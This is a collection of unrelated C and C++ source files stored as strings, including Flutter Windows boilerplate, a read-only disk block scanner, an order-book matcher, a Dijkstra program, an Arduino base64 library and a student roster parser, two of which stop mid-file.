    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   Ice.cpp                                            :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: oldault <oldault@student.42.fr>            +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/05/05 19:22:28 by oldault           #+#    #+#             */\n/*   Updated: 2024/05/06 16:59:00 by oldault          ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"Ice.hpp\"\n\nIce::Ice() :\n  AMateria(\"ice\")\n{\n  std::cout << FGRN(BOLD(\"Ice\")) << FGRN(\" constructor called\\n\");\n  \n  return ;\n}\n\nIce::Ice(const Ice& other) :\n  AMateria(other)\n{\n  std::cout << FGRN(BOLD(\"Ice\")) << FGRN(\" copy constructor called\\n\");\n\n  return ;\n}\n\nIce::~Ice()\n{\n  std::cout << FRED(BOLD(\"Ice\")) << FRED( \" destructor called\\n\");\n  \n  return ;\n}\n\nIce& Ice::operator=(const Ice& other)\n{\n  if (this != &other) {\n    AMateria::operator=(other);\n  }\n  std::cout << FGRN(BOLD(\"Ice\")) << FGRN(\" copy operator called\\n\");\n\n  return *this;\n}\n\nAMateria* Ice::clone() const\n{\n  return new Ice(*this);\n}\n\nvoid Ice::use(ICharacter& target)\n{\n  std::cout << FCYN(\"\\t* shoots an ice bolt at \") FCYN( << (target.getName()) << \" *\\n\");\n\n  return ;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"animdo_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// Copyright (c) 2024 Arista Networks, Inc.  All rights reserved.\n// Arista Networks, Inc. Confidential and Proprietary.\n\n#include <iostream>\n#include <fstream>\n#include <string>\n#include <vector>\n#include <thread>\n#include <cstdint>\n#include <mutex>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <linux/fs.h>\n#include <sys/ioctl.h>\n\n#ifndef __USE_GNU\n#define __USE_GNU\n#endif\n\n\nstd::mutex mtx; // Mutex for synchronized output\n\nvoid readBlock(const std::string& ssd_device, uint64_t block_number, \n               int block_size, int fd, char * buffer,\n               std::ofstream& success_log, std::ofstream& failed_log) {\n    off_t offset = block_number * block_size;\n    if (lseek(fd, offset, SEEK_SET) == -1) {\n        std::cerr << \"Error seeking to block offset\" << std::endl;\n        return;\n    }\n\n    std::lock_guard<std::mutex> lock(mtx);\n    ssize_t bytes_read = read(fd, buffer, block_size);\n    if (bytes_read == -1) {\n        std::cerr << \"Error reading block: \" << block_number << std::endl;\n        failed_log << \"Error reading block: \" << block_number << std::endl;\n    } else if (bytes_read != block_size) {\n        std::cerr << \"Incomplete block read: \" << block_number << std::endl;\n        failed_log << \"Incomplete block read: \" << block_number << std::endl;\n    } else {\n\tsuccess_log << \"Block \" << block_number << \": Read successful\" << std::endl;\n    }\n    return;\n\n}\n\nlong long get_block_device_size(const char* device_path, long long* total_bytes,\n        unsigned long* block_size, int fd) {\n\n    if (ioctl(fd, BLKGETSIZE64, total_bytes) == -1) {\n        std::cerr << \"Device \" << device_path << \"BLKGETSIZE64 ioctl failed\" << std::endl;\n\treturn 1;\n    }\n    if (ioctl(fd, BLKSSZGET, block_size) < 0) {\n        std::cerr << \"Device \" << device_path << \"BLKSSZGET ioctl failed\" << std::endl;\n        return 1;\n    }\n\n    std::cout << \"Block device size in bytes: \" << *total_bytes << std::endl;\n    std::cout << \"Device Block size in bytes: \" << *block_size << std::endl;\n    return 0;\n}\n\nint main() {\n    std::string ssd_device = \"/dev/sda\";  // Specify the SSD device here\n    unsigned long block_size = 0;         // Specify the block size of your SSD in bytes\n    // total size of the device in bytes\n    long long total_bytes = 0;\n    // Container to hold thread objects\n    std::vector<std::thread> threads;\n\n    // Number of concurrent threads (adjust as needed)\n    int num_threads = std::thread::hardware_concurrency();\n    int* fd = new int[num_threads];\n    for (int i = 0; i < num_threads; i++) {\n        fd[i] = open(ssd_device.c_str(), O_RDONLY | O_DIRECT);\n        if (fd[i] == -1) {\n            std::cerr << \"Error opening SSD device\" << std::endl;\n            return 1;\n        }\n    }\n\n    int res = get_block_device_size(ssd_device.c_str(), &total_bytes,\n            &block_size, fd[0]);\n    if(res || block_size == 0 || total_bytes == 0) {\n        std::cerr << \"get_block_device_size failed\" << std::endl;\n        return 1;\n    }\n    // Read multiple blocks to speed up.\n    block_size = block_size * 256;\n    // Calculate the total number of blocks based on the block size and total size\n    uint64_t total_blocks = total_bytes / block_size;\n    std::cout << \"Total number of blocks : \" << total_blocks << std::endl;\n    std::cout << \"Total number of bytes : \" << total_bytes << std::endl;\n    std::cout << \"Read block size : \" << block_size << std::endl;\n\n    std::ofstream success_log(\"/tmp/success\");\n    std::ofstream failed_log(\"/tmp/failed\");\n\n    char ** buffer = new char*[num_threads];;\n    for (int i = 0; i < num_threads; i++) {\n        posix_memalign((void**)&buffer[i], block_size, block_size);\n    }\n    // Launch threads to read blocks concurrently\n    for (uint64_t block_number = 0; block_number < total_blocks;\n            block_number += num_threads) {\n        for (int i = 0;\n             i < num_threads && (block_number + i) < total_blocks;\n             i++)\n        {\n            threads.emplace_back(readBlock, ssd_device, block_number + i,\n                                 block_size, fd[i], buffer[i],\n                                 std::ref(success_log), std::ref(failed_log));\n        }\n        // Join threads to wait for them to finish\n        for (auto& thread : threads) {\n            thread.join();\n        }\n        // Clear the vector for the next batch of threads\n        threads.clear();\n    }\n\n    for (int i = 0; i < num_threads; i++) {\n        free(buffer[i]);\n        close(fd[i]);\n    }\n    success_log.close();\n    failed_log.close();\n\n    return 0;\n}\n\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "/*\n * Copyright (c) 2011-2015 BlackBerry Limited.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n * http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include \"applicationui.hpp\"\n\n#include <bb/cascades/Application>\n\n#include <QLocale>\n#include <QTranslator>\n\n#include <Qt/qdeclarativedebug.h>\n\nusing namespace bb::cascades;\n\nQ_DECL_EXPORT int main(int argc, char **argv)\n{\n    Application app(argc, argv);\n\n    // Create the Application UI object, this is where the main.qml file\n    // is loaded and the application scene is set.\n    ApplicationUI appui;\n\n    // Enter the application main event loop.\n    return Application::exec();\n}\n",
    "#include \"libary.h\"\n\nenum class OrderType\n{\n\tGoodTillCancel,  // holds till user says no and cancels the damn order\n\tFillandKill // completely execute the entire order immediately (fill) or cancel the entire order (kill) if it cannot be filled immediately. (have time constrains)\n};\n\nenum class Side\n{\n\tBuy,\n\tSell\n};\n\n\nusing Price = std::int32_t;\nusing Quantity = std::uint32_t;\nusing OrderID = std::uint64_t; // string here?\n\nstruct LevelInfo\n{\n\tPrice price_;\n\tQuantity quantity_;\n};\n\nusing LevelInfos = std::vector<LevelInfo>;\n\nclass OrderbookLevelInfos\n{\npublic:\n\tOrderbookLevelInfos(const LevelInfos& bids, const LevelInfos& asks)\n\t\t: bids_{ bids }\n\t\t, asks_{ asks }\n\t{ }\n\n\tconst LevelInfos& GetBids() const { return bids_; }\n\tconst LevelInfos& GetAsks() const { return asks_; }\n\nprivate:\n\tLevelInfos bids_;\n\tLevelInfos asks_;\n};\n\nclass Order\n{\npublic:\n    Order(OrderType orderType, OrderID orderID, Side side, Price price, Quantity quantity)\n        : orderType_{ orderType }, orderID_{ orderID }, side_{ side },\n        price_{ price }, initialQuantity_{ quantity }, remainingQuantity_{ quantity } {}\n\n    OrderType GetOrderType() const { return orderType_; }\n    OrderID GetOrderID() const { return orderID_; }\n    Side GetSide() const { return side_; }\n    Price GetPrice() const { return price_; }\n    Quantity GetInitialQuantity() const { return initialQuantity_; }\n    Quantity GetRemainingQuantity() const { return remainingQuantity_; }\n    Quantity GetFilledQuantity() const { return GetInitialQuantity() - GetRemainingQuantity(); }\n    bool isFilled() const { return  GetRemainingQuantity() == false;  }\n    void Fill(Quantity quantity)\n    {\n        if (quantity > GetRemainingQuantity())\n        {\n            std::ostringstream oss;\n            oss << \"Order (\" << GetOrderID() << \") cannot be filled for more than its remainder quantity.\";\n            throw std::logic_error(oss.str());\n        }\n\n        remainingQuantity_ -= quantity;\n    }\n\nprivate:\n    OrderType orderType_;\n    OrderID orderID_;\n    Side side_;\n    Price price_;\n    Quantity initialQuantity_;\n    Quantity remainingQuantity_;\n};\n\nusing OrderPointer = std::shared_ptr<Order>;\nusing OrderPointers = std::list<OrderPointer>;\n\nclass OrderModify\n{\npublic :\n    OrderModify(OrderID orderID, Side side, Price price, Quantity quantity)\n        : orderID_{ orderID }\n        , price_{ price }\n        , side_{ side }\n        , quantity_{ quantity }\n    { }\n\n    OrderID GetOrderID() const { return orderID_; }\n    Side GetSide() const { return side_; }\n    Price GetPrice() const { return price_; }\n    Quantity GetQuantity() const { return quantity_; }\n\n    OrderPointer ToOrderPointer( OrderType type  ) const\n    {\n        return std::make_shared<Order>(type, GetOrderID(), GetSide(), GetPrice(), GetQuantity());\n    }\n\nprivate:\n    OrderID orderID_;\n    Price price_;\n    Side side_;\n    Quantity quantity_;\n};\n\n\nstruct TradeInfo //interface for tthe trade\n{\n    OrderID orderID_;\n    Price price_;\n    Quantity quantity_;\n};\n\nclass Trade // aggreaation of bid and ask sides.\n{\npublic:\n    Trade (const TradeInfo& bidTrade, const TradeInfo& askTrade)\n        : bidTrade_ {bidTrade}\n        , askTrade_ {askTrade}\n    { }\n\n    const TradeInfo& GetBidTrade() const { return bidTrade_; }\n    const TradeInfo& GetAskTrade() const { return askTrade_; }\n\nprivate:\n    TradeInfo bidTrade_;\n    TradeInfo askTrade_;\n\n\n};\n\n\nusing Trades = std::vector<Trade>;\n\nclass Orderbook\n{\nprivate:\n    //using a map for bids (in descending from best bid ) and ask (ascending for best ask) we can have O(N) access . \n    // order iterator for its location \n    struct OrderEntry\n    {\n        OrderPointer order_{ nullptr };\n        OrderPointers::iterator location_;\n\n    };\n\n\n    std::map<Price, OrderPointers, std::greater<Price>> bids_;\n    std::map<Price, OrderPointers, std::less<Price>> asks_;\n    std::unordered_map<OrderID, OrderEntry> orders_;\n\n    //match methods\n    // so we add an order, if its not f&k we add to the list, else if it doesnt match , we discard instantly\n\n    bool CanMatch(Side side, Price price) const\n    {\n        if (side == Side::Buy)\n        {\n            if (asks_.empty())\n                return false;\n\n            const auto& [bestAsk, _] = *asks_.begin();\n            return price >= bestAsk;\n        }\n        else\n        {\n            if (bids_.empty())\n                return false;\n\n            const auto& [bestBid, _] = *bids_.begin();\n            return price <= bestBid;\n        }\n    }\n\n    Trades MatchOrders()\n    {\n        Trades trades;\n        trades.reserve(orders_.size());\n\n        while (true)\n        {\n            if (bids_.empty() || asks_.empty())\n                break;\n\n            auto& [bidPrice, bids] = *bids_.begin();\n            auto& [askPrice, asks] = *asks_.begin();\n\n            if (bidPrice < askPrice)\n                break;\n\n            while (!bids.empty() && !asks.empty())\n            {\n                auto bid = bids.front();\n                auto as",
    "#include <iostream>\nusing namespace std;\n\n#define MAX 100\n#define TEMP 0\n#define PERM 1\n#define infinity 9999\n#define NIL -1\n\nvoid findPath(int s, int v);\nvoid Dijkstra(int s);\nint min_temp();\nvoid create_graph();\n\nint n; // number of vertices\nint adj[MAX][MAX];\nint pred[MAX];\nint pathlength[MAX];\nint status[MAX];\n\nint main() {\n    int s, v;\n\n    create_graph();\n    cout << \"Enter the source vertex: \";\n    cin >> s;\n    Dijkstra(s); // Step 1: Call Dijkstra's algorithm to find shortest paths\n\n    // Start of while loop\n    while (1) {\n        cout << \"Enter destination vertex (-1 to quit): \";\n        cin >> v;\n\n        if (v == -1)\n            break;\n        if (v < 0 || v >= n)\n            cout << \"This vertex does not exist\\n\";\n        else if (v == s)\n            cout << \"Source and destination vertices are the same\\n\";\n        else if (pathlength[v] == infinity)\n            cout << \"There is no path from source to destination vertex\\n\";\n        else\n            findPath(s, v); // Step 2: Call findPath to print the shortest path\n    }\n    // End of while loop\n\n    return 0;\n} // End of main section\n\n// Step 3: Implementation of Dijkstra's algorithm\nvoid Dijkstra(int s) {\n    int i, current;\n\n    // Step 3.1: Initialize vertices\n    for (i = 0; i < n; i++) {\n        pred[i] = NIL;\n        pathlength[i] = infinity;\n        status[i] = TEMP;\n    }\n\n    // Step 3.2: Set path length of source vertex to 0\n    pathlength[s] = 0;\n\n    // Start of while loop\n    while (1) {\n        // Step 3.3: Find vertex with minimum path length\n        current = min_temp();\n\n        if (current == NIL)\n            return;\n        status[current] = PERM; // Step 3.4: Mark vertex as permanent\n\n        // Step 3.5: Update adjacent vertices' path lengths if necessary\n        for (i = 0; i < n; i++) {\n            if ((adj[current][i] != 0) && (status[i] == TEMP))\n                if (pathlength[current] + adj[current][i] < pathlength[i]) {\n                    pred[i] = current; // Step 3.5.1: Update predecessor\n                    pathlength[i] = pathlength[current] + adj[current][i]; // Step 3.5.2: Update path length\n                }\n        }\n    }\n} // End of Dijkstra function\n\n// Step 4: Implementation of min_temp function\nint min_temp() {\n    int i;\n    int min = infinity;\n    int k = NIL;\n    for (i = 0; i < n; i++) {\n        if (status[i] == TEMP && pathlength[i] < min) {\n            min = pathlength[i];\n            k = i;\n        }\n    }\n    return k;\n} // End of min_temp\n\n// Step 5: Implementation of findPath function\nvoid findPath(int s, int v) {\n    int i, u;\n    int path[MAX]; // stores the shortest path\n    int shortDist = 0; // length of shortest path\n    int count = 0; // number of vertices in the shortest path\n\n    // Step 5.1: Store the full path in the array path\n    while (v != s) {\n        count++;\n        path[count] = v;\n        u = pred[v];\n        shortDist += adj[u][v];\n        v = u;\n    }\n    count++;\n    path[count] = s;\n\n    // Step 5.2: Print the shortest path and its length\n    cout << \"Shortest path is: \";\n    for (i = count; i >= 1; i--)\n        cout << path[i] << \" \";\n    cout << \"\\nThe shortest distance is: \" << shortDist << endl;\n} // End of findPath\n\n// Function to create the graph\nvoid create_graph() {\n    int i, max_edges, origin, destin, wt;\n    cout << \"Enter the number of vertices: \";\n    cin >> n;\n\n    max_edges = n * (n - 1);\n\n    for (i = 1; i <= max_edges; i++) {\n        cout << \"Enter edge \" << i << \" (enter -1 -1 to finish): \";\n        cin >> origin >> destin;\n\n        if (origin == -1 && destin == -1)\n            break;\n\n        cout << \"Enter weight of this edge: \";\n        cin >> wt;\n\n        if (origin > n || destin > n || origin < 0 || destin < 0) {\n            cout << \"Invalid edge! Please enter again.\" << endl;\n            i--;\n        } else\n            adj[origin][destin] = wt; // Step 6: Store edge weight in adjacency matrix\n    }\n}\n\n//Output\n/*\nEnter the number of vertices: 3\nEnter edge 1 (enter -1 -1 to finish): 0 0\nEnter weight of this edge: 6\nEnter edge 2 (enter -1 -1 to finish): 0 1\nEnter weight of this edge: 7\nEnter edge 3 (enter -1 -1 to finish): 0 2\nEnter weight of this edge: 10\nEnter edge 4 (enter -1 -1 to finish): 1 1\nEnter weight of this edge: 1\nEnter edge 5 (enter -1 -1 to finish): 1 2\nEnter weight of this edge: -11\nEnter edge 6 (enter -1 -1 to finish): 2 0\nEnter weight of this edge: 5\nEnter the source vertex: 0\nEnter destination vertex (-1 to quit): 2\nShortest path is: 0 1 2 \nThe shortest distance is: -4\nEnter destination vertex (-1 to quit): -1\n*/\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"expense_tracker\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\n * Copyright (c) 2013 Adam Rudd.\n * See LICENSE for more information\n * https://github.com/adamvr/arduino-base64 \n */\n#if (defined(__AVR__))\n#include <avr\\pgmspace.h>\n#else\n#include <pgmspace.h>\n#endif\n\nconst char PROGMEM b64_alphabet[] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n\t\t\"abcdefghijklmnopqrstuvwxyz\"\n\t\t\"0123456789+/\";\n\n/* 'Private' declarations */\ninline void a3_to_a4(unsigned char * a4, unsigned char * a3);\ninline void a4_to_a3(unsigned char * a3, unsigned char * a4);\ninline unsigned char b64_lookup(char c);\n\nint base64_encode(char *output, char *input, int inputLen) {\n\tint i = 0, j = 0;\n\tint encLen = 0;\n\tunsigned char a3[3];\n\tunsigned char a4[4];\n\n\twhile(inputLen--) {\n\t\ta3[i++] = *(input++);\n\t\tif(i == 3) {\n\t\t\ta3_to_a4(a4, a3);\n\n\t\t\tfor(i = 0; i < 4; i++) {\n\t\t\t\toutput[encLen++] = pgm_read_byte(&b64_alphabet[a4[i]]);\n\t\t\t}\n\n\t\t\ti = 0;\n\t\t}\n\t}\n\n\tif(i) {\n\t\tfor(j = i; j < 3; j++) {\n\t\t\ta3[j] = '\\0';\n\t\t}\n\n\t\ta3_to_a4(a4, a3);\n\n\t\tfor(j = 0; j < i + 1; j++) {\n\t\t\toutput[encLen++] = pgm_read_byte(&b64_alphabet[a4[j]]);\n\t\t}\n\n\t\twhile((i++ < 3)) {\n\t\t\toutput[encLen++] = '=';\n\t\t}\n\t}\n\toutput[encLen] = '\\0';\n\treturn encLen;\n}\n\nint base64_decode(char * output, char * input, int inputLen) {\n\tint i = 0, j = 0;\n\tint decLen = 0;\n\tunsigned char a3[3];\n\tunsigned char a4[4];\n\n\n\twhile (inputLen--) {\n\t\tif(*input == '=') {\n\t\t\tbreak;\n\t\t}\n\n\t\ta4[i++] = *(input++);\n\t\tif (i == 4) {\n\t\t\tfor (i = 0; i <4; i++) {\n\t\t\t\ta4[i] = b64_lookup(a4[i]);\n\t\t\t}\n\n\t\t\ta4_to_a3(a3,a4);\n\n\t\t\tfor (i = 0; i < 3; i++) {\n\t\t\t\toutput[decLen++] = a3[i];\n\t\t\t}\n\t\t\ti = 0;\n\t\t}\n\t}\n\n\tif (i) {\n\t\tfor (j = i; j < 4; j++) {\n\t\t\ta4[j] = '\\0';\n\t\t}\n\n\t\tfor (j = 0; j <4; j++) {\n\t\t\ta4[j] = b64_lookup(a4[j]);\n\t\t}\n\n\t\ta4_to_a3(a3,a4);\n\n\t\tfor (j = 0; j < i - 1; j++) {\n\t\t\toutput[decLen++] = a3[j];\n\t\t}\n\t}\n\toutput[decLen] = '\\0';\n\treturn decLen;\n}\n\nint base64_enc_len(int plainLen) {\n\tint n = plainLen;\n\treturn (n + 2 - ((n + 2) % 3)) / 3 * 4;\n}\n\nint base64_dec_len(char * input, int inputLen) {\n\tint i = 0;\n\tint numEq = 0;\n\tfor(i = inputLen - 1; input[i] == '='; i--) {\n\t\tnumEq++;\n\t}\n\n\treturn ((6 * inputLen) / 8) - numEq;\n}\n\ninline void a3_to_a4(unsigned char * a4, unsigned char * a3) {\n\ta4[0] = (a3[0] & 0xfc) >> 2;\n\ta4[1] = ((a3[0] & 0x03) << 4) + ((a3[1] & 0xf0) >> 4);\n\ta4[2] = ((a3[1] & 0x0f) << 2) + ((a3[2] & 0xc0) >> 6);\n\ta4[3] = (a3[2] & 0x3f);\n}\n\ninline void a4_to_a3(unsigned char * a3, unsigned char * a4) {\n\ta3[0] = (a4[0] << 2) + ((a4[1] & 0x30) >> 4);\n\ta3[1] = ((a4[1] & 0xf) << 4) + ((a4[2] & 0x3c) >> 2);\n\ta3[2] = ((a4[2] & 0x3) << 6) + a4[3];\n}\n\ninline unsigned char b64_lookup(char c) {\n\tif(c >='A' && c <='Z') return c - 'A';\n\tif(c >='a' && c <='z') return c - 71;\n\tif(c >='0' && c <='9') return c + 4;\n\tif(c == '+') return 62;\n\tif(c == '/') return 63;\n\treturn -1;\n}",
    "/*\n * This file is part of ALVAR, A Library for Virtual and Augmented Reality.\n *\n * Copyright 2007-2012 VTT Technical Research Centre of Finland\n *\n * Contact: VTT Augmented Reality Team <alvar.info@vtt.fi>\n *          <http://www.vtt.fi/multimedia/alvar.html>\n *\n * ALVAR is free software; you can redistribute it and/or modify it under the\n * terms of the GNU Lesser General Public License as published by the Free\n * Software Foundation; either version 2.1 of the License, or (at your option)\n * any later version.\n *\n * This library is distributed in the hope that it will be useful, but WITHOUT\n * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or\n * FITNESS FOR A PARTICULAR PURPOSE. See the GNU Lesser General Public License\n * for more details.\n *\n * You should have received a copy of the GNU Lesser General Public License\n * along with ALVAR; if not, see\n * <http://www.gnu.org/licenses/old-licenses/lgpl-2.1.html>.\n */\n\n#include \"TrackerStat.h\"\n\nusing namespace std;\n\nnamespace alvar\n{\nusing namespace std;\n\nTrackerStat::TrackerStat(int binsize) : f(100, 90)\n{\n  hist.AddDimension(binsize);  // x\n  hist.AddDimension(binsize);  // y\n}\n\nvoid TrackerStat::Reset()\n{\n  f.Reset();\n}\n\ndouble TrackerStat::Track(IplImage* img)\n{\n  if (img == NULL)\n    return -1;\n  f.Track(img);\n  hist.Clear();\n  for (int p = 0; p < f.prev_feature_count; p++)\n  {\n    for (int c = 0; c < f.feature_count; c++)\n    {\n      if (f.prev_ids[p] != f.ids[c])\n        continue;\n      float x = f.features[c].x - f.prev_features[p].x;\n      float y = f.features[c].y - f.prev_features[p].y;\n      hist.Inc(x, y);\n    }\n  }\n  xd = 0;\n  yd = 0;\n  return hist.GetMax(&xd, &yd);\n}\n\nvoid TrackerStat::Compensate(double* x, double* y)\n{\n  *x += xd;\n  *y += yd;\n}\n\nTrackerStatRot::TrackerStatRot(int binsize /*=8*/, int binsize_rot /*=3*/)\n  : TrackerStat(binsize)\n{\n  hist_rot.AddDimension(binsize_rot);\n}\n\ndouble TrackerStatRot::Track(IplImage* img)\n{\n  if (img == NULL)\n    return -1;\n  f.Track(img);\n  // Translation\n  hist.Clear();\n  for (int p = 0; p < f.prev_feature_count; p++)\n  {\n    for (int c = 0; c < f.feature_count; c++)\n    {\n      if (f.prev_ids[p] != f.ids[c])\n        continue;\n      float x = f.features[c].x - f.prev_features[p].x;\n      float y = f.features[c].y - f.prev_features[p].y;\n      hist.Inc(x, y);\n    }\n  }\n  xd = 0;\n  yd = 0;\n  double ret = hist.GetMax(&xd, &yd);\n  // Rotation\n  x_res = img->width;\n  y_res = img->height;\n  hist_rot.Clear();\n  for (int p = 0; p < f.prev_feature_count; p++)\n  {\n    for (int c = 0; c < f.feature_count; c++)\n    {\n      if (f.prev_ids[p] != f.ids[c])\n        continue;\n      double x_pred = f.prev_features[p].x + xd;\n      double y_pred = f.prev_features[p].y + yd;\n      double x_curr = f.features[c].x;\n      double y_curr = f.features[c].y;\n      double x = x_curr - x_pred;\n      double y = y_curr - y_pred;\n      double theta_pred =\n          atan2((double)y_pred - (y_res / 2), (double)x_pred - (x_res / 2)) *\n          180.0 / 3.1415926535;\n      double theta_curr =\n          atan2((double)y_curr - (y_res / 2), (double)x_curr - (x_res / 2)) *\n          180.0 / 3.1415926535;\n      hist_rot.Inc(theta_curr - theta_pred);\n    }\n  }\n  rotd = 0;\n  hist_rot.GetMax(&rotd);\n  return ret;\n}\n\nvoid TrackerStatRot::Compensate(double* x, double* y)\n{\n  double xx = *x - (x_res / 2);\n  double yy = *y - (y_res / 2);\n  double kosini = cos(rotd * 3.1415926535 / 180);\n  double sini = sin(rotd * 3.1415926535 / 180);\n  *x = ((kosini * xx) - (sini * yy)) + xd + (x_res / 2);\n  *y = ((sini * xx) + (kosini * yy)) + yd + (y_res / 2);\n}\n\n}  // namespace alvar\n",
    "//\n//  roster.cpp\n//  ClassRoster2\n//\n//  Created by Parvaty Chery on 2024-04-23.\n//\n\n#include \"roster.hpp\"// including the roster header file to use the Roster class\n#include <iostream>\n#include <sstream>\n#include <iomanip>\n#include <string>\n\nusing namespace std;\n\n//this is the function to parse the student data and add it to the roster\nvoid Roster::parse(string allstudentdata){\n    \n    \n    //will allow to find and extract each piece of info from the input string\n    \n    //first we find the position of the first comma\n    std::string::size_type rightside = allstudentdata.find(','); // this finds the comma\n    string studentid = allstudentdata.substr(0, rightside);\n    //second, it extracts the student ID from the beginning of teh string\n    \n    \n    //move on to the next comma in the data and find its position\n    std::string::size_type leftside = rightside + 1; // this moves past the previous comma\n    rightside = allstudentdata.find(',', leftside);\n    string firstname = allstudentdata.substr(leftside, rightside - leftside); //first name- extract the first name from the string\n    \n    //this process repeats for the last name, email and age and the degree program\n    \n    leftside = rightside + 1; // this keeps the loop going\n    rightside = allstudentdata.find(',', leftside);\n    string lastname = allstudentdata.substr(leftside, rightside - leftside); //last name\n    \n    leftside = rightside + 1; //keeps going\n    rightside = allstudentdata.find(',', leftside);\n    string emailaddress = allstudentdata.substr(leftside, rightside - leftside); //email address\n    \n    leftside = rightside + 1; // keeps going\n    rightside = allstudentdata.find(',', leftside);\n    int studentage = stoi(allstudentdata.substr(leftside, rightside - leftside));\n    \n    leftside = rightside + 1; // continue on to the next one\n    rightside = allstudentdata.find(',', leftside);\n    int daysforcourse1 = stod(allstudentdata.substr(leftside, rightside - leftside)); /*first element for days in course*/\n    leftside = rightside + 1; // continue on to the next one\n    rightside = allstudentdata.find(',', leftside);\n    int daysforcourse2 = stod(allstudentdata.substr(leftside, rightside - leftside)); /*second element for days in course*/\n    leftside = rightside + 1; // continue on to the next one\n    rightside = allstudentdata.find(\",\", leftside);\n    int daysforcourse3 = stod(allstudentdata.substr(leftside, rightside - leftside)); /*third element for days in course*/\n    \n    leftside = rightside + 1;\n    rightside = allstudentdata.find(\",\", leftside);\n    \n    DegreeProgram dp = SECURITY;//set the default program to SECURITY\n    if (allstudentdata[leftside] == 'S') {/*CHECKS IF THE FIRST CHARACTER AFTER THE COMMA IS S; 